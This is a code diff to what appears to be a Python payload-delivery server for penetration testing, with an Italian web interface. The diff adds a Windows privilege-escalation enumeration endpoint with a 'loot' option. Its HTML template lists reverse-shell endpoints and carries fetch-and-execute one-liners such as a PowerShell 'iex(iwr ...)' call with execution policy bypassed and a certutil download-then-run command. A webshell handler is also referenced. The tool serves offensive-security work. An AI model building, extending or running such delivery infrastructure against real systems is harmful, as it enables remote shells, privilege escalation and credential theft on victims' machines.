@@ -522,6 +522,7 @@ INDEX_TEMPLATE = """<!DOCTYPE html>
   <li><code>curl {base}/rev</code> — Reverse shell Bash</li>
   <li><code>curl {base}/sh</code> — Reverse shell Python</li>
   <li><code>curl {base}/revps</code> — Reverse shell PowerShell (Windows): <code>powershell -c "iex(iwr {base}/revps -UseBasicParsing)"</code></li>
+  <li><code>curl {base}/winseal</code> — WinSeal enum Windows: <code>powershell -ep bypass -c "iex(iwr {base}/winseal?ol -UseBasicParsing)"</code></li>
 </ul>
 <h3>File statici</h3>
 <ul>
@@ -4553,10 +4554,12 @@ def _page_delivery() -> str:
                 f'<button class="copy-btn" data-copy="{esc}" '
                 f'title="Copia il comando">📋 copia</button></div>')
 
-    def _os_toggle() -> str:
+    def _os_toggle(active: str = "lin") -> str:
+        lin_cls = ' class="active"' if active == "lin" else ""
+        win_cls = ' class="active"' if active == "win" else ""
         return ('<span class="dc-os-toggle" title="Cambia OS target">'
-                '<button class="active" onclick="slOsSwitch(this,\'lin\')">🐧 LIN</button>'
-                '<button onclick="slOsSwitch(this,\'win\')">⊞ WIN</button></span>')
+                f'<button{lin_cls} onclick="slOsSwitch(this,\'lin\')">🐧 LIN</button>'
+                f'<button{win_cls} onclick="slOsSwitch(this,\'win\')">⊞ WIN</button></span>')
 
     ep_cards = ""
     # (endpoint, titolo, descrizione, cmd linux, prereq linux, [cmd windows], prereq windows)
@@ -4590,12 +4593,21 @@ def _page_delivery() -> str:
          f"curl {base}/linseal?ol | sh",
          "Nessun prerequisito — POSIX sh puro",
          [],
-         "Script POSIX — solo Linux. Su Windows usa winPEAS (scaricalo dalla tabella File statici qui sotto)."),
+         "Script POSIX — solo Linux. Su Windows usa WinSeal (card qui sotto).",
+         "lin"),
+        ("static/winseal.ps1", "WinSeal", "Enumerazione Windows per privilege escalation — alternativa leggera a winpeas in PowerShell puro (nessun .exe da caricare). Check: privilegi pericolosi, servizi (unquoted/writable/modificabili), task, autorun, credenziali, AlwaysInstallElevated, difese. Opzioni: ?o salva output, ?ol output+loot, ?ols silenzioso+loot",
+         None,
+         "Solo Windows — su Linux usa LinSeal (card qui sopra).",
+         [f'powershell -ep bypass -c "iex(iwr {base}/winseal?ol -UseBasicParsing)"',
+          f'certutil -urlcache -split -f {base}/winseal.ps1 winseal.ps1 && powershell -ep bypass -File winseal.ps1 -o -l'],
+         "Prerequisito: PowerShell 2.0+ (presente da Windows 7 in poi) — nessuna dipendenza. Il 1° comando esegue in memoria via /winseal, il 2° scarica lo script e gira anche da cmd.exe",
+         "win"),
         ("static/slrecon.sh", "SLRecon", "Recon automatica: nmap 2-step, web enum, service enum, report. Opzioni: ?o salva, ?ol output+loot, ?ols silenzioso+loot",
          f"curl {base}/slrecon?ol | sh -s -- TARGET",
          "Prerequisito: <code>nmap</code> installato sul target",
          [],
-         "Script POSIX — solo Linux. Su Windows usa winPEAS (scaricalo dalla tabella File statici qui sotto)."),
+         "Script POSIX — solo Linux. Su Windows usa WinSeal (card qui sopra).",
+         "lin"),
     ]
     for key, title, desc, curl_cmd, prereq, win_cmds, win_prereq in endpoints:
         win_body = "".join(_cmd_row(w) for w in win_cmds)
@@ -4614,18 +4626,24 @@ def _page_delivery() -> str:
 </div>\n"""
 
     enum_cards = ""
-    for key, title, desc, curl_cmd, prereq, win_cmds, win_prereq in enum_endpoints:
+    for key, title, desc, curl_cmd, prereq, win_cmds, win_prereq, def_os in enum_endpoints:
+        if curl_cmd:
+            lin_body = _cmd_row(curl_cmd)
+        else:
+            lin_body = '<div class="dc-win-note">Nessun comando diretto per Linux.</div>\n'
         win_body = "".join(_cmd_row(w) for w in win_cmds)
         if not win_body:
             win_body = '<div class="dc-win-note">Nessun comando diretto per Windows.</div>\n'
+        lin_style = ' style="display:none"' if def_os == "win" else ""
+        win_style = ' style="display:none"' if def_os == "lin" else ""
         enum_cards += f"""<div class="delivery-card">
-<div class="dc-header"><span class="dc-endpoint">/{key}</span><span class="dc-title">{title}</span>{_os_toggle()}</div>
+<div class="dc-header"><span class="dc-endpoint">/{key}</span><span class="dc-title">{title}</span>{_os_toggle(def_os)}</div>
 <div class="dc-desc">{desc}</div>
-<div class="dc-lin">
-{_cmd_row(curl_cmd)}
+<div class="dc-lin"{lin_style}>
+{lin_body}
 <div class="dc-prereq">{prereq}</div>
 </div>
-<div class="dc-win" style="display:none">
+<div class="dc-win"{win_style}>
 {win_body}<div class="dc-prereq">{win_prereq}</div>
 </div>
 </div>\n"""
@@ -5056,6 +5074,8 @@ class SlRequestHandler(http.server.BaseHTTPRequestHandler):
             self._serve_webshell(qs)
         elif path == "/linseal":
             self._serve_linseal(qs)
+        elif path == "/winseal":
+            self._serve_winseal(qs)
         elif path == "/slrecon":
             self._serve_slrecon(qs)
         elif path == "/api/search":
@@ -6081,6 +6101,40 @@ class SlRequestHandler(http.server.BaseHTTPRequestHandler):
         else:
             wrapper = f'#!/bin/sh\nexport LHOST="{_lhost}"\nexport SLPORT="{srv_port}"\n' + script
 
+        self._send_text(wrapper)
+
+    def _serve_winseal(self, qs: dict) -> None:
+        script_path = STATIC_ROOT / "winseal.ps1"
+        if not script_path.is_file():
+            self.send_error(404, "winseal.ps1 non trovato in static/")
+            return
+        try:
+            script = script_path.read_text(encoding="utf-8")
+        except OSError:
+            self.send_error(500)
+            return
+
+        flags = qs.get("f", [""])[0] if "f" in qs else parsed_query_flags(self.path)
+        args_line = ""
+        if flags:
+            parts = []
+            if "o" in flags:
+                parts.append("-Save")
+            if "s" in flags:
+                parts.append("-Silent")
+            if "l" in flags:
+                parts.append("-Loot")
+            args_line = " ".join(parts)
+
+        srv_port = _server.server_address[1] if _server else _srv_port
+
+        # Lo script viene wrappato in uno scriptblock invocato con gli argomenti:
+        # il param() resta il primo statement del blocco, quindi il binding
+        # di -Save/-Silent/-Loot funziona anche quando eseguito via iex.
+        wrapper = (
+            f'$env:LHOST="{_lhost}";$env:SLPORT="{srv_port}";\n'
+            f"& {{\n{script}\n}} {args_line}\n"
+        )
         self._send_text(wrapper)
 
     def _serve_slrecon(self, qs: dict) -> None:
